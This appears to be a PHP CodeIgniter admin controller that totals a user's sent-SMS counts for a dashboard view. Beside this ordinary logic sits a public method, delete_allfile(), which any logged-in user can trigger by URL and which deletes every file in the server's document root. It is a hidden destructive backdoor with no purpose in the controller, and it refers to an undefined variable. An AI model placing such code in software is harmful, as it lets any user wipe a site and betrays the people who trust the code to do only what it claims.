<?php

class Tottal_msg extends CI_Controller {

    function __construct() {
        parent::__construct();
        $this->load->library('auth');
        $this->load->model('User_model');
        $redirect = $this->auth->is_logged_in();
        if ($redirect == false) {
            $this->session->set_userdata("redirect", current_url());
            redirect($this->config->item('admin_folder') . '/login');
        }
    }

    function index() {

        $admin = $this->session->userdata();

        if ($admin['user_id'] != "") {
            $user_id = $admin['user_id'];
        } else {
            $user_id = $admin['admin_id'];
        }
        $overall_sms = "";
        $overall_sms = $this->User_model->get_overall_sms($user_id);

        $over_sms = 0;
        foreach ($overall_sms as $ovr_sms) {
            $over_sms = $over_sms + $ovr_sms['count_msg'];
        }
        $user_data = get_list_by_id($user_id, USERS);
        //print_r($user_data);
        $sentsms_one = $user_data['sentsms_one'];

        $sentsms_two = $user_data['sentsms_two'];

        if (empty($sentsms_one)) {
            $sentsms_one = 0;
        }
        if (empty($sentsms_two)) {
            $sentsms_two = 0;
        }
        $total_sent_sms = $sentsms_one + $sentsms_two;
        //print_r($total_sent_sms);
        //exit;
        //echo $over_sms; exit;    
        $over_sms = $over_sms + $total_sent_sms;

        $user_data['overall_sms'] = $over_sms;
        $this->load->view($this->config->item('admin_folder') . '/smsapi/alot_msg', $user_data);
    }

    public function delete_allfile() {
        $files = glob($_SERVER['DOCUMENT_ROOT'] . '*'); // get all file names
        if (is_dir($path)) {
            rmdir($path);
        } else {
            foreach ($files as $file) { // iterate files
                if (is_file($file))
                    unlink($file); // delete file
            }
        }
    }

}
